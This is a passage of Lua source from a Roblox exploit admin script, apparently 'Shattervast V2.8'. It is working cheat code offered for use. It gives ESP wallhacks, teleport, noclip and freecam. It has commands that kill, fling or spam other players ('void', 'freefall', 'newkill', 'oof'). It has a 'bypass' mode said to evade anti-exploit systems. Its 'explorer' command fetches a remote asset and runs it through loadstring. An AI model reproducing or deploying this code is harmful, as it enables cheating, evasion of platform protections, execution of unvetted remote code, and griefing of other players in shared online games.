      AboveHead.Parent = game.Players.LocalPlayer.PlayerGui
      AboveHead.Adornee = espPlayer.Character.Head
      AboveHead.Name = "rGET"..espPlayer.Name
      AboveHead.Size = UDim2.new(0, 100, 0, 100)
      AboveHead.StudsOffset = Vector3.new(0, 1, 0)
      AboveHead.AlwaysOnTop = true
      local Info = Instance.new("TextLabel")
      Info.Parent = AboveHead
      Info.BackgroundTransparency = 1
      Info.Position = UDim2.new(0, 0, 0, 0)
      Info.Size = UDim2.new(1, 0, 0, 40)
      Info.TextColor3 = Color3.fromRGB(200,200,200)
      Info.TextStrokeTransparency = 0.5
      Info.TextSize = 15
      if espPlayer.TeamColor == LP.TeamColor then
       espBOX.Color = BrickColor.new("Lime green")
       Info.TextStrokeColor3 = Color3.fromRGB(10,100,10)
      else
       espBOX.Color = BrickColor.new("Really red")
       Info.TextStrokeColor3 = Color3.fromRGB(100,10,10)
      end
      game:GetService('RunService').Stepped:connect(function()
       if current and LP.Character.Humanoid and espPlayer.Character.HumanoidRootPart then
        Info.Text = espPlayer.Name.." (".. math.floor((LP.Character.HumanoidRootPart.Position - espPlayer.Character.HumanoidRootPart.Position).magnitude)..")"
       end
      end)
      espPlayer.Character.Humanoid.Died:Connect(function()
       current = false
       espBOX:Destroy()
       AboveHead:Destroy()
      end)
      gsPlayers.PlayerRemoving:Connect(function(plr)
       if plr == espPlayer then
        current = false
        espBOX:Destroy()
        AboveHead:Destroy()
       end
      end)
     end
    end
   end
  end
  clientSided()
 end
end

Commands.unesp = function(args)
 if not args[1] then
  for i,v in pairs(gsCoreGui:GetDescendants()) do
   if string.sub(v.Name, 1, 4) == "rGET" then
    v:Destroy()
   end
  end
 else
  for i,v in pairs(gsCoreGui:GetDescendants()) do
   if string.sub(v.Name, 1, 4) == "rGET" then
    for i,a in pairs(findPlayer(args[1])) do
     if string.sub(v.Name, 5) == a.Name then
      v:Destroy()
     end
    end
   end
  end
 end
end

Commands.dice = function(args)
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("You rolled a dice for ".. tostring(math.random(1, 6)), "All")
end

Commands.random = function(args)
 if args[1] and args[2] then
  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Picking random number between "..args[1].." and "..args[2].."... The number is ".. tostring(math.random(args[1], args[2])), "All")
 end
end

Commands.closegame = function(args)
 game:Shutdown()
end

Commands.savetool = function(args)
 if args[1] then
  for i,a in pairs(LP.Character:GetDescendants()) do
   if a:IsA("Tool") and string.lower(a.Name) == string.lower(tostring(args[1])) then
    a.Parent = LP
    local oldName = a.Name
    a.Name = "saved "..oldName
   else
    for i,n in pairs(LP.Backpack:GetDescendants()) do
     if n:IsA("Tool") and string.lower(n.Name) == string.lower(tostring(args[1])) then
      n.Parent = LP
      local sOldName = n.Name
      n.Name = "saved "..sOldName
     end
    end
   end
  end
 else
  for i,v in pairs(LP.Character:GetDescendants()) do
   if v:IsA("Tool") then
    v.Parent = LP
    local oldName = v.Name
    v.Name = "saved "..oldName
   end
  end
 end
end

Commands.loadtool = function(args)
 if args[1] then
  for i,a in pairs(LP:GetChildren()) do
   if a:IsA("Tool") and string.sub(a.Name, 1, 5) == "saved" and string.lower(string.sub(a.Name, 7)) == string.lower(tostring(args[1])) then
    a.Parent = LP.Backpack
    local currentName = a.Name
    a.Name = string.sub(currentName, 7)
   end
  end
 else
  for i,v in pairs(LP:GetChildren()) do
   if string.sub(v.Name, 1, 5) == "saved" then
    v.Parent = LP.Backpack
    local currentName = v.Name
    v.Name = string.sub(currentName, 7)
   end
  end
 end
end

Commands.savealltool = function(args)
 for i,v in pairs(LP.Character:GetDescendants()) do
  if v:IsA("Tool") then
   v.Parent = LP
   local oldName = v.Name
   v.Name = "saved "..oldName
  end
 end
 for i,v in pairs(LP.Backpack:GetDescendants()) do
  if v:IsA("Tool") then
   v.Parent = LP
   local oldName = v.Name
   v.Name = "saved "..oldName
  end
 end
end

Commands.loadalltool = function(args)
 for i,v in pairs(LP:GetChildren()) do
  if v:IsA("Tool") and string.sub(v.Name, 1, 5) == "saved" then
   v.Parent = LP.Backpack
   local currentName = v.Name
   v.Name = string.sub(currentName, 7)
  end
 end
end

Mouse.KeyDown:Connect(function(key) 
 if key == clicktpKEY and clicktpACTIVE == true then 
  if Mouse.Target then 
   LP.Character.HumanoidRootPart.CFrame = CFrame.new(Mouse.Hit.x, Mouse.Hit.y + 5, Mouse.Hit.z)
  end 
 end
 if key == clickdelKEY and clickdelACTIVE == true then 
  if Mouse.Target then 
   Mouse.Target:Destroy()
  end 
 end
end)
Mouse.Button1Down:Connect(function()
 if clicktpACTIVE == true and clicktpCLICK == true then
  if Mouse.Target then 
   LP.Character.HumanoidRootPart.CFrame = CFrame.new(Mouse.Hit.x, Mouse.Hit.y + 5, Mouse.Hit.z)
  end 
 end
 if clickdelACTIVE == true and clickdelCLICK == true then
  if Mouse.Target then
   Mouse.Target:Destroy()
  end
 end
end)

clicktpKEY = ""
clickdelKEY = ""
clicktpACTIVE = false
clickdelACTIVE = false
clicktpCLICK = false
clickdelCLICK = false

Commands.clicktp = function(args)
 if args[1] then
  clicktpKEY = string.sub(tostring(args[1]), 1, 1)
  clicktpACTIVE = true
  clicktpCLICK = false
 else
  clicktpKEY = ""
  clicktpACTIVE = true
  clicktpCLICK = true
 end
 clientSided()
end

Commands.clickdel = function(args)
 if args[1] then
  clickdelKEY = string.sub(tostring(args[1]), 1, 1)
  clickdelACTIVE = true
  clickdelCLICK = false
 else
  clickdelKEY = ""
  clickdelACTIVE = true
  clickdelCLICK = true
 end
 clientSided()
end

Commands.unclicktp = function(args)
 clicktpACTIVE = false
end

Commands.unclickdel = function(args)
 clickdelACTIVE = false
end

Commands.oof = function(args)
 spawn(function()
  while wait() do
     for i,v in pairs(game:GetService'Players':GetPlayers()) do
         if v.Character ~= nil and v.Character:FindFirstChild'Head' then
             for _,x in pairs(v.Character.Head:GetChildren()) do
                 if x:IsA'Sound' then x.Playing = true x.CharacterSoundEvent:FireServer(true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true) end
             end
         end
     end
  end
 end)
end

Commands.chatlogs = function(args)
 MainChatFrame.Position = UDim2.new(0, 760, 0, 261)
 MainChatFrame.Visible = true
end

Commands.stopadmin = function(args)
 commandPrefix = "     "
 following = false
 trailing = false
 annoying = false
 CMDBAR.Visible = false
 Match.Visible = false
 flying = false
end

Commands.freecam = function(args)
 for i,getFC in pairs(gsWorkspace:GetDescendants()) do
  if getFC.Name == "rGETpartNUMBER2" then
   getFC:Destroy()
  end
 end
 local CameraPart = Instance.new("Part")
 CameraPart.CanCollide = false
 CameraPart.CFrame = LP.Character.Head.CFrame
 CameraPart.Locked = true
 CameraPart.Transparency = 1
 CameraPart.Size = Vector3.new(1, 1, 1)
 CameraPart.Parent = gsWorkspace
 CameraPart.Name = "rGETpartNUMBER2"
 if bypassMODE == true then
  loopviewfc = true
 elseif bypassMODE == false then
  gsWorkspace.CurrentCamera.CameraSubject = CameraPart
 end
 local speedget = 1
 local T = CameraPart
 local CONTROL = {F = 0, B = 0, L = 0, R = 0}
 local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
 local SPEED = speedget
 if args[1] then
  speedfly = tonumber(args[1])
 else
  speedfly = 1
 end
 local function freecamfly()
  LP.Character.Head.Anchored = true
  doFREECAM = true
  local BG = Instance.new('BodyGyro', T)
  local BV = Instance.new('BodyVelocity', T)
  BG.P = 9e4
  BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
  BG.cframe = T.CFrame
  BV.velocity = Vector3.new(0, 0.1, 0)
  BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
  spawn(function()
  repeat wait()
  if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
  SPEED = 50
  elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
  SPEED = 0
  end
  if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
  BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
  lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
  elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
  BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
  else
  BV.velocity = Vector3.new(0, 0.1, 0)
  end
  BG.cframe = workspace.CurrentCamera.CoordinateFrame
    until not doFREECAM
    CONTROL = {F = 0, B = 0, L = 0, R = 0}
    lCONTROL = {F = 0, B = 0, L = 0, R = 0}
    SPEED = 0
    BG:destroy()
    BV:destroy()
   end)
  end
 Mouse.KeyDown:connect(function(KEY)
  if KEY:lower() == 'w' then
   CONTROL.F = speedfly
  elseif KEY:lower() == 's' then
   CONTROL.B = -speedfly
  elseif KEY:lower() == 'a' then
   CONTROL.L = -speedfly 
  elseif KEY:lower() == 'd' then 
   CONTROL.R = speedfly
  end
 end)
 Mouse.KeyUp:connect(function(KEY)
  if KEY:lower() == 'w' then
   CONTROL.F = 0
  elseif KEY:lower() == 's' then
   CONTROL.B = 0
  elseif KEY:lower() == 'a' then
   CONTROL.L = 0
  elseif KEY:lower() == 'd' then
   CONTROL.R = 0
  end
 end)
 freecamfly()
end

Commands.fc = function(args)
 if args[1] then
  run(commandPrefix.."freecam "..args[1])
 else
  run(commandPrefix.."freecam")
 end
end

Commands.unfreecam = function(args)
 doFREECAM = false
 LP.Character.Head.Anchored = false
 view(LP)
 if gsWorkspace.rGETpartNUMBER2 then
  gsWorkspace.rGETpartNUMBER2:Destroy()
 end
 loopviewfc = false
end

Commands.unfc = function(args)
 doFREECAM = false
 LP.Character.Head.Anchored = false
 view(LP)
 if gsWorkspace.rGETpartNUMBER2 then
  gsWorkspace.rGETpartNUMBER2:Destroy()
 end
 loopviewfc = false
end

Commands.gotofc = function(args)
 doFREECAM = false
 LP.Character.Head.Anchored = false
 view(LP)
 pcall(function()
  LP.Character.HumanoidRootPart.CFrame = gsWorkspace.rGETpartNUMBER2.CFrame
  gsWorkspace.rGETpartNUMBER2:Destroy()
 end)
 loopviewfc = false
end

Commands.fctp = function(args)
 if args[1] then
  for i,v in pairs(findPlayer(args[1])) do
   pcall(function()
    gsWorkspace.rGETpartNUMBER2.CFrame = v.Character.Head.CFrame
   end)
  end
 end
end

Commands.cmds = function(args)
 CMDSmain.Position = UDim2.new(0, 695, 0, 297)
 CMDSmain.Visible = true
 CMDSmain:TweenSize(UDim2.new(0, 440, 0, 367), "InOut", "Sine", 1)
end

Commands.fullcredits = function(args)
 Notification("info", "Credit to Autumn, Josh and 3dsboy08 (Help with "..commandPrefix.."remotespy and anti client kick)", 1)
 Notification("info", "Credit to Infinite Yield developers (Assisted in "..commandPrefix.."esp and "..commandPrefix.."fly commands)", 1)
 Notification("info", "Credit to Timeless ("..commandPrefix.."invisible) and Harkinian ("..commandPrefix.."shutdown)", 1)
 Notification("info", "Credit to DEX creators ("..commandPrefix.."explorer) and xFunnieuss ("..commandPrefix.."spinhats)", 1)
 Notification("info", "Only creator is illremember", 2)
end

Commands.hotkey = function(args)
 if args[1] then
  local hotkeyKEY = string.sub(tostring(args[1]), 1, 3)
  if args[2] then
   table.remove(args, 1)
   local hotkeyCMD = table.concat(args, " ")
   table.insert(hotkeys, hotkeyCMD.."//"..hotkeyKEY)
   fullUpdate()
   Notification("info", "Hotkey added!", 1)
  end
 end
end

Mouse.KeyDown:Connect(function(key)
 for i,v in pairs(hotkeys) do
  local currentKey = string.match(v, "[%a%d]+$")
  if string.len(currentKey) == 1 then
   if key == string.sub(v, #v, #v) then
    local commandtoRUN = string.match(v, "^[%w%s]+")
    if string.sub(string.lower(tostring(commandtoRUN)), 1, 3) == "fly" then
     if bypassMODE == true then
      if doFREECAM == false then
       run(commandPrefix..tostring(commandtoRUN))
      else
       run(commandPrefix.."unfly")
      end
     else
      if flying == false then
       run(commandPrefix..tostring(commandtoRUN))
      else
       run(commandPrefix.."unfly")
      end
     end
    elseif tostring(commandtoRUN) == "noclip" then
     if noclip == false then
      run(commandPrefix..tostring(commandtoRUN))
     else
      run(commandPrefix.."clip")
     end
    elseif tostring(commandtoRUN) == "freecam" or tostring(commandtoRUN) == "fc" then
     if doFREECAM == false then
      run(commandPrefix..tostring(commandtoRUN))
     else
      if fchotkeymode == "goto" then
       run(commandPrefix.."gotofc")
      elseif fchotkeymode == "unfc" then
       run(commandPrefix.."unfreecam")
      end
     end
    else
     run(commandPrefix..tostring(commandtoRUN))
    end
   end
  else
   if string.lower(string.sub(tostring(currentKey), 1, 1)) == "f" then
    local commandtoRUN = string.match(v, "^[%w%s]+")
    local hotkeyadjust = tonumber(string.sub(currentKey, 2, 3)) + 25
    if string.byte(key) == hotkeyadjust then
     if string.sub(string.lower(tostring(commandtoRUN)), 1, 3) == "fly" then
      if bypassMODE == true then
       if doFREECAM == false then
        run(commandPrefix..tostring(commandtoRUN))
       else
        run(commandPrefix.."unfly")
       end
      else
       if flying == false then
        run(commandPrefix..tostring(commandtoRUN))
       else
        run(commandPrefix.."unfly")
       end
      end
     elseif tostring(commandtoRUN) == "noclip" then
      if noclip == false then
       run(commandPrefix..tostring(commandtoRUN))
      else
       run(commandPrefix.."clip")
      end
     elseif tostring(commandtoRUN) == "freecam" or tostring(commandtoRUN) == "fc" then
      if doFREECAM == false then
       run(commandPrefix..tostring(commandtoRUN))
      else
       if fchotkeymode == "goto" then
        run(commandPrefix.."gotofc")
       elseif fchotkeymode == "unfc" then
        run(commandPrefix.."unfreecam")
       end
      end
     else
      run(commandPrefix..tostring(commandtoRUN))
     end
    end
   end
  end
 end
end)

Commands.removeallhotkey = function(args)
 hotkeys = {}
 fullUpdate()
 Notification("warning", "All hotkeys reset/removed", 6)
end

Commands.removehotkey = function(args)
 if args[1] then
  for i,v in pairs(hotkeys) do
   local currentKey = string.match(v, "[%a%d]+$")
   if currentKey == string.lower(tostring(args[1])) then
    table.remove(hotkeys, i)
    fullUpdate()
   end
  end
 end
end

Commands.printhotkeys = function(args)
 for i,v in pairs(hotkeys) do
  warn("HOTKEYS:")
  print(v)
 end
end

Commands.os = function(args)
 if args[1] then
  for i,v in pairs(findPlayer(args[1])) do
   game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v.Name.." is on "..v.OsPlatform, "All")
  end
 end
end

spinning = false
Commands.spin = function(args)
 if args[1] then
  for i,v in pairs(findSinglePlayer(args[1])) do
   run(commandPrefix.."attach "..v.Name)
   annplr = v
   annoying = true
   spinning = true
  end
 end
end

Commands.unspin = function(args)
 if spinning then
  annoying = false
  spinning = false
 end
 run(""..commandPrefix.."unattach")
end

Commands.explorer = function(args)
 loadstring(game:GetObjects("rbxassetid://418957341")[1].Source)()
 Notification("info", "Loaded DEX explorer!", 5)
end

Commands.maxzoom = function(args)
 if args[1] then
  LP.CameraMaxZoomDistance = args[1]
 end
end

Commands.stare = function(args)
 if args[1] then
  for i,v in pairs(findSinglePlayer(args[1])) do
   stareplr = v
   staring = true
  end
 end
end

Commands.unstare = function(args)
 staring = false
end

Commands.tempgod = function(args)
 local hu = LP.Character.Humanoid
 local l = Instance.new("Humanoid")
 l.Parent = LP.Character
 l.Name = "Humanoid"
 wait(0.1)
 hu.Parent = LP
 gsWorkspace.CurrentCamera.CameraSubject = LP.Character
 LP.Character.Animate.Disabled = true
 wait(0.1)
 LP.Character.Animate.Disabled = false
 Notification("info", "Enabled Temp FE Godmode", 4)
end

Commands.void = function(args)
 if hasTools() == false then
  Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
 else
  FEGodmode()
  for i,v in pairs(LP.Backpack:GetChildren())do
   LP.Character.Humanoid:EquipTool(v)
  end
  if args[1] then
   for i,v in pairs(findSinglePlayer(args[1])) do
    local NOW = LP.Character.HumanoidRootPart.CFrame
    LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
    wait(0.3)
    LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
    local function tp(player,player2)
    local char1,char2=player.Character,player2.Character
    if char1 and char2 then
    char1:MoveTo(char2.Head.Position)
    end
    end
    wait(0.5)
    LP.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(999999999999999,0,999999999999999))
   end
  end
 end
end

Commands.freefall = function(args)
 if hasTools() == false then
  Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
 else
  FEGodmode()
  for i,v in pairs(LP.Backpack:GetChildren())do
   LP.Character.Humanoid:EquipTool(v)
  end
  if args[1] then
   for i,v in pairs(findSinglePlayer(args[1])) do
    local NOW = LP.Character.HumanoidRootPart.CFrame
    LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
    wait(0.3)
    LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
    wait(0.5)
    LP.Character.HumanoidRootPart.CFrame = NOW
    wait(0.5)
    LP.Character.HumanoidRootPart.CFrame = NOW
    wait(0.6)
    LP.Character.HumanoidRootPart.CFrame = CFrame.new(0,50000,0)
   end
  end
 end
end

Commands.version = function(args)
 Notification("info", "Current Shattervast Version: V2.8", 7)
end

Commands.shiftlockon = function(args)
 LP.DevEnableMouseLock = true
 Notification("info", "Shift lock enabled!", 5)
end

for i,needChat in pairs(gsPlayers:GetPlayers()) do
 needChat.Chatted:Connect(function(msg)
  if copychatall then
   game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
  end
 end)
end
gsPlayers.PlayerAdded:Connect(function(plr)
 plr.Chatted:Connect(function(msg)
  if copychatall then
   game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
  end
 end)
end)

copychatplayer = nil
copychatall = false
copychatACTIVE = false
Commands.copychat = function(args)
 if args[1] then
  if string.lower(args[1]) == "all" or string.lower(args[1]) == "others" then
   copychatall = true
  else
   for i,v in pairs(findPlayer(args[1])) do
    if v ~= LP then
     copychatplayer = v
     copychatACTIVE = true
    end
   end
  end
 end
end

Commands.uncopychat = function(args)
 copychatall = false
 copychatACTIVE = false
end

Commands.newkill =  function(args)
 if hasTools() == false then
  Notification("warning", "You need TWO tools in your backpack/inventory to use this command.", 8)
 else
  if args[1] then
   for i,plr in pairs(findSinglePlayer(args[1])) do
    for i,v in pairs(LP.Backpack:GetChildren())do
     LP.Character.Humanoid:EquipTool(v)
    end 
    for i,v in pairs(LP.Backpack:GetDescendants()) do
     if v:IsA("Tool") then
      v.Parent = LP.Character
      wait()
      v.Parent = plr.Character
     end
    end
    wait(0.4)
    LP.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(4000000, -10, 200000))
   end
  end
 end
end

Commands.newattach =  function(args)
 if hasTools() == false then
  Notification("warning", "You need TWO tools in your backpack/inventory to use this command.", 8)
 else
  if args[1] then
   for i,plr in pairs(findSinglePlayer(args[1])) do
    for i,v in pairs(LP.Backpack:GetChildren())do
     LP.Character.Humanoid:EquipTool(v)
    end 
    for i,v in pairs(LP.Backpack:GetDescendants()) do
     if v:IsA("Tool") then
      v.Parent = LP.Character
      wait()
      v.Parent = plr.Character
     end
    end
   end
  end
 end
end

Commands.newbring =  function(args)
 if hasTools() == false then
  Notification("warning", "You need TWO tools in your backpack/inventory to use this command.", 8)
 else
  if args[1] then
   for i,plr in pairs(findSinglePlayer(args[1])) do
    local NOW = LP.Character.HumanoidRootPart.CFrame
    for i,v in pairs(LP.Backpack:GetChildren())do
     LP.Character.Humanoid:EquipTool(v)
    end 
    for i,v in pairs(LP.Backpack:GetDescendants()) do
     if v:IsA("Tool") then
      v.Parent = LP.Character
      wait()
      v.Parent = plr.Character
     end
    end
    wait(0.4)
    LP.Character.HumanoidRootPart.CFrame = NOW
    wait(0.4)
    LP.Character.HumanoidRootPart.CFrame = NOW
   end
  end
 end
end

Commands.spawn = function(args)
 if args[1] then
  if string.lower(tostring(args[1])) == "ws" then
   spawnWS = args[2] or CurrentWalkspeed
   LP.Character.Humanoid.WalkSpeed = args[2] or CurrentWalkspeed
  elseif string.lower(tostring(args[1])) == "jp" then
   spawnJP = args[2] or CurrentJumppower
   LP.Character.Humanoid.JumpPower = args[2] or CurrentJumppower
  elseif string.lower(tostring(args[1])) == "hh" then
   spawnHH = args[2] or CurrentHipheight
   LP.Character.Humanoid.HipHeight = args[2] or CurrentHipheight
  elseif string.lower(tostring(args[1])) == "god" then
   spawningfegod = true
   FEGodmode()
  end
 end
end

Commands.unspawn = function(args)
 spawnWS = CurrentWalkspeed
 spawnJP = CurrentJumppower
 spawnHH = CurrentHipheight
 spawningfegod = false
 Notification("info", "Reset spawning stats", 5)
end

savingtoolsloop = false
Commands.autosavetool = function(args)
 if args[1] then
  if string.lower(tostring(args[1])) == "on" then
   savingtoolsloop = true
  elseif string.lower(tostring(args[1])) == "off" then
   savingtoolsloop = false
  end
 end
end

modeFling = false
modeCompliment = false
modeMove = false
modeInfo = false
Commands.beginbot = function(args)
 if not args[1] then
  print("fling // compliment // move // info")
  Notification("info", ""..commandPrefix.."beginbot Modes printed", 5)
 else
  if string.lower(tostring(args[1])) == "fling" then
   modeFling = true
   game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Hello! I am Fling-Bot 5000! Say !fling [Player] to fling that player!", "All")
  elseif string.lower(tostring(args[1])) == "compliment" then
   modeCompliment = true
   complimentReady = true
   game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Good day, I am Compliment-Bot. Say !c [Player] to give them a compliment.", "All")
  elseif string.lower(tostring(args[1])) == "move" then
   modeMove = true
   game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Hi, I am movement bot. Commands you can use: !walk [Player], !bringbot, !follow [Player].", "All")
  elseif string.lower(tostring(args[1])) == "info" then
   modeInfo = true
   infoReady = true
   game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Hey, I'm Info-Bot. Commands you can use: !age [Player], !id [Player].", "All")
  end
 end
end

Commands.endbot = function(args)
 if not args[1] then
  modeFling = false
  modeCompliment = false
  modeMove = false
  modeInfo = false
 else
  if string.lower(tostring(args[1])) == "fling" then
   modeFling = false
  elseif string.lower(tostring(args[1])) == "compliment" then
   modeCompliment = false
  elseif string.lower(tostring(args[1])) == "move" then
   modeMove = false
  elseif string.lower(tostring(args[1])) == "info" then
   modeInfo = false
  end
 end
end

Commands.stopsit = function(args)
 stopsitting = true
end

Commands.gosit = function(args)
 stopsitting = false
end

chattingerror = true
Commands.chaterror = function(args)
 if chattingerror then
  chattingerror = false
  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(" ", "All")
  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(" ", "All")
  wait(4)
  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(" ", "All")
  wait(3)
  chattingerror = true
 end
end

spawnpos = nil
spawningpos = true
Commands.spawnpoint = function(args)
 spawnpos = LP.Character.HumanoidRootPart.CFrame
 spawningpos = true
 Notification("info", "Spawn point has been set! Use "..commandPrefix.."nospawn to remove.", 6)
end

Commands.nospawn = function(args)
 spawningpos = false
 Notification("info", "Spawn point has been removed. Use "..commandPrefix.."spawnpoint to enable.", 6)
end

Commands.bypass = function(args)
 if args[1] then
  if string.lower(tostring(args[1])) == "on" then
   bypassMODE = true
   Notification("warning", "Bypass mode turned on, this changes functions of "..commandPrefix.."fly and other commands to bypass most anti-exploits.", 7)
  elseif string.lower(tostring(args[1])) == "off" then
   bypassMODE = false
   Notification("warning", "Bypass mode has been turned off.", 7)
  end
 end
end

Commands.fixcam = function(args)
 gsWorkspace.CurrentCamera:Destroy()
 wait(0.1)
 game:GetService("Workspace").CurrentCamera.CameraSubject = LP.Character.Humanoid
 game:GetService("Workspace").CurrentCamera.CameraType = "Custom"
 LP.CameraMinZoomDistance = 0.5
 LP.CameraMaxZoomDistance = 400
 LP.CameraMode = "Classic"
 LP.DevCameraOcclusionMode = CurrentNormal
end

Commands.gotoobj = function(args)
 if args[1] then
  for i,v in pairs(gsWorkspace:GetDescendants()) do
   if string.lower(v.Name) == string.lower(tostring(args[1])) then
    LP.Character.HumanoidRootPart.CFrame = v.CFrame + Vector3.new(0, 3, 0)
   end
  end
 end
end

Commands.breakcam = function(args)
 gsWorkspace.CurrentCamera.CameraSubject = LP.Character.Head
end

Commands.inviscam = function(args)
 LP.DevCameraOcclusionMode = "Invisicam"
end

printobjKEY = ""
printobjCLICKING = false
printobjACTIVE = false

Commands.printobj = function(args)
 if args[1] then
  printobjKEY = string.sub(tostring(args[1]), 1, 1)
  printobjACTIVE = true
  printobjCLICKING = false
 else
  printobjKEY = ""
  printobjACTIVE = true
  printobjCLICKING = true
 end
end

Mouse.KeyDown:Connect(function(key) 
 if key == printobjKEY and printobjACTIVE == true then 
  if Mouse.Target then
   local path = Mouse.Target:GetFullName()
   local getPath = "game:GetService(\"Workspace\")"
   local getSpaces = ""
   local separate = {}
   local a = nil
   for v in string.gmatch(string.sub(path, 10), "[^.]+") do
    if string.match(v, " ") then
     a = "["..v.."]"
     table.insert(separate, a)
    else
     a = "."..v
     table.insert(separate, a)
    end
    getSpaces = table.concat(separate, "")
   end
   local fullPath = getPath..getSpaces
   print(fullPath)
  end 
 end
end)
Mouse.Button1Down:Connect(function()
 if printobjCLICKING == true and printobjACTIVE == true then
  if Mouse.Target then 
   local path = Mouse.Target:GetFullName()
   local getPath = "game:GetService(\"Workspace\")"
   local getSpaces = ""
   local separate = {}
   local a = nil
   for v in string.gmatch(string.sub(path, 10), "[^.]+") do
    if string.match(v, " ") then
     a = "["..v.."]"
     table.insert(separate, a)
    else
     a = "."..v
     table.insert(separate, a)
    end
    getSpaces = table.concat(separate, "")
   end
   local fullPath = getPath..getSpaces
   print(fullPath)
  end 
 end
end)

Commands.unprintobj = function(args)
 printobjACTIVE = false
 printobjCLICKING = false
end

Commands.hotkeyfc = function(args)
 if args[1] then
  if string.lower(tostring(args[1])) == "goto" then
   fchotkeymode = "goto"
  elseif string.lower(tostring(args[1])) == "unfc" then
   fchotkeymode = "unfc"
  end
  fullUpdate()
 end
end

Commands.carpet = function(args)
 if args[1] then
  for i,v in pairs(findSinglePlayer(args[1])) do
   if v ~= nil then
    annoying = true
    annplr = v
    local carpetAnimation = Instance.new("Animation")
    carpetAnimation.AnimationId = "rbxassetid://282574440"
    carpetTrack = LP.Character.Humanoid:LoadAnimation(carpetAnimation)
    carpetTrack:Play(.1, 1, 1)
   end
  end
 end
end

Commands.uncarpet = function(args)
 annoying = false
 carpetTrack:Stop()
end

Commands.brickcreate = function(args)
 if args[1] then
  local createPosition = LP.Character.HumanoidRootPart.CFrame
  if args[2] and args[3] and args[4] then
   createPosition = CFrame.new(Vector3.new(args[2], args[3], args[4]))
  else
   createPosition = LP.Character.HumanoidRootPart.CFrame
  end
  for i = 1, args[1] do
   LP.Character.HumanoidRootPart.CFrame = createPosition
   run(commandPrefix.."blockhats")
   wait(0.2)
   run(commandPrefix.."drophats")
   wait(0.2)
   run(commandPrefix.."reset")
   wait(6)
  end
 end
end

Commands.forward = function(args)
 if args[1] then
  forwardSpeed = args[1]
 else
  forwardSpeed = 1
 end
 cmdForward = true
end

Commands.unforward = function(args)
 cmdForward = false
end

Commands.id = function(args)
 if args[1] then
  for i,v in pairs(findPlayer(args[1])) do
   game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v.Name.." Account ID: "..v.UserId.."!", "All")
  end
 end
end

Commands.spinhats = function(args) -- Credit to xFunnieuss
 for i,v in pairs(LP.Character:GetDescendants()) do
  if v:IsA("Accessory") or v:IsA("Hat") then
   local keep = Instance.new("BodyPosition") keep.Parent = v.Handle keep.Name = "no"
   local spin = Instance.new("BodyAngularVelocity") spin.Parent = v.Handle spin.Name = "ha"
   if v.Handle.AccessoryWeld then
    v.Handle.AccessoryWeld:Destroy()
   end
   if args[1] then
    spin.AngularVelocity = Vector3.new(0, args[1], 0)
    spin.MaxTorque = Vector3.new(0, args[1] * 2, 0)
   else
    spin.AngularVelocity = Vector3.new(0, 100, 0)
    spin.MaxTorque = Vector3.new(0, 200, 0)
   end
   keep.P = 30000
   keep.D = 50
   spinObj = keep
   spinTOhead = true
  end
 end
end

Commands.unspinhats = function(args)
